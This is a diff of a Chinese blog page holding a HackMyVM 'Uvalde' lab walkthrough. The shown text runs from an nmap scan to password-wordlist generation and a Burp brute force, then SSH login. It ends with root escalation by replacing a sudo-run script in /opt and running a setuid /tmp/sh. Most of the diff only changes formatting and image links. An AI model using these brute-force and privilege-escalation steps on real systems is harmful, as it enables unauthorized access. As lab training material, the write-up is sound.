@@ -7,18 +7,16 @@
     <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
     <script src='https://7r1UMPH.github.io/plugins/theme.js'></script>
     <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
-<meta name="description" content="# hmv_uvalde
+<meta name="description" content="# 0.简介
 
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Uvalde  
-**难度**：绿色  
-**目标 IP**：192.168.205.149  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Uvalde
+ 难度：绿色
+ 目标 IP：192.168.205.149
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -66,7 +64,6 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
-
 ```
 
 # 2.踩点
@@ -150,18 +147,16 @@ Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE='0']
 
 暂时没啥作用，继续踩点。">
 <meta property="og:title" content="hmv_uvalde">
-<meta property="og:description" content="# hmv_uvalde
+<meta property="og:description" content="# 0.简介
 
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Uvalde  
-**难度**：绿色  
-**目标 IP**：192.168.205.149  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Uvalde
+ 难度：绿色
+ 目标 IP：192.168.205.149
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -209,7 +204,6 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
-
 ```
 
 # 2.踩点
@@ -362,14 +356,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1>hmv_uvalde</h1>
-<h1>0.简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Uvalde" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Uvalde</a><br>
-<strong>难度</strong>：绿色<br>
-<strong>目标 IP</strong>：192.168.205.149<br>
-<strong>本机 IP</strong>：192.168.205.128</p>
+<div class="markdown-body" id="postBody"><h1>0.简介</h1>
+<p>靶机：<a href="https://hackmyvm.eu/machines/machine.php?vm=Uvalde" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Uvalde</a><br>
+难度：绿色<br>
+目标 IP：192.168.205.149<br>
+本机 IP：192.168.205.128</p>
 <h1>1.扫描</h1>
-<p>​<code class="notranslate">nmap</code>​起手</p>
+<p>nmap起手</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -A -Pn -n --min-rate 10000 192.168.205.149
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:15 CST
@@ -415,7 +408,6 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
-
 </code></pre>
 <h1>2.踩点</h1>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -581,18 +573,18 @@ Finished
                                                                  
 </code></pre>
 <p>有一个注册/create_account.php，我们尝试注册</p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250208092519-sns84x7.png"><img src="assets/image-20250208092519-sns84x7.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fd58755833063d3550438cfdf025982f384a056cc1419c8dccbd924cdb288d57/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303230323833312e706e67"><img src="https://camo.githubusercontent.com/fd58755833063d3550438cfdf025982f384a056cc1419c8dccbd924cdb288d57/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303230323833312e706e67" alt="image-20250331190202777" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190202831.png" style="max-width: 100%;"></a></p>
 <p>后面那一串有点像64,我们拿起解密看看</p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250208092623-8oxemyq.png"><img src="assets/image-20250208092623-8oxemyq.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fd58755833063d3550438cfdf025982f384a056cc1419c8dccbd924cdb288d57/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303230323833312e706e67"><img src="https://camo.githubusercontent.com/fd58755833063d3550438cfdf025982f384a056cc1419c8dccbd924cdb288d57/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303230323833312e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190202831.png" style="max-width: 100%;"></a></p>
 <p>可以看到它的密码格式是以用户名+注册年+@+随机4位数，那我们生成字典爆破一下</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ for i in $(seq -w 0 9999); do echo "matthew2023@$i" ;done &gt; pass
 </code></pre>
 <p>打开我们的burp</p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250208093236-5dmc1ys.png"><img src="assets/image-20250208093236-5dmc1ys.png" alt="image" style="max-width: 100%;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250208093257-yv5jokl.png"><img src="assets/image-20250208093257-yv5jokl.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4f5d1d3a57dc7972216bf5770291834057555bc7c67001c9c6714d4f43a04f17/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303231343532312e706e67"><img src="https://camo.githubusercontent.com/4f5d1d3a57dc7972216bf5770291834057555bc7c67001c9c6714d4f43a04f17/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303231343532312e706e67" alt="image-20250331190214441" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190214521.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d55e6658f1c04fc7850e4b3c1a3543db702da7f78290ce3913383f5607383694/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303231393835352e706e67"><img src="https://camo.githubusercontent.com/d55e6658f1c04fc7850e4b3c1a3543db702da7f78290ce3913383f5607383694/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303231393835352e706e67" alt="image-20250331190219774" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190219855.png" style="max-width: 100%;"></a></p>
 <p>421长度明显不一样，我们使用这个密码测试登录</p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250208093442-m2ddsnf.png"><img src="assets/image-20250208093442-m2ddsnf.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e47df7f90d86d56983ae54fe19e4829a0f73b2271f56566a0f39a06cb7257c9a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303232353535302e706e67"><img src="https://camo.githubusercontent.com/e47df7f90d86d56983ae54fe19e4829a0f73b2271f56566a0f39a06cb7257c9a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139303232353535302e706e67" alt="image-20250331190225481" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331190225550.png" style="max-width: 100%;"></a></p>
 <p>我们先尝试可不可以ssh登录</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ssh matthew@192.168.205.149
@@ -613,7 +605,6 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 matthew@uvalde:~$ id
 uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
-
 </code></pre>
 <h1>3.提权</h1>
 <pre class="notranslate"><code class="notranslate">matthew@uvalde:~$ sudo -l
@@ -689,7 +680,6 @@ printf "${JAUNE}Target $domain ====&gt; PWNED${RESET}\n"
 printf "${JAUNE}URL: https://$domain/*********************.php${RESET}\n"
 
 echo -e "\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n"
-
 </code></pre>
 <p>我们可以修改当前目录，使用把脚本换一下就好了</p>
 <pre class="notranslate"><code class="notranslate">matthew@uvalde:/opt$ mv superhack superhack1
@@ -734,8 +724,8 @@ drwxrwxrwt  2 root root    4096 Feb  8 02:14 .XIM-unix
 matthew@uvalde:/opt$ /tmp/sh -p
 sh-5.1# id
 uid=1000(matthew) gid=1000(matthew) euid=0(root) groups=1000(matthew)
-
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
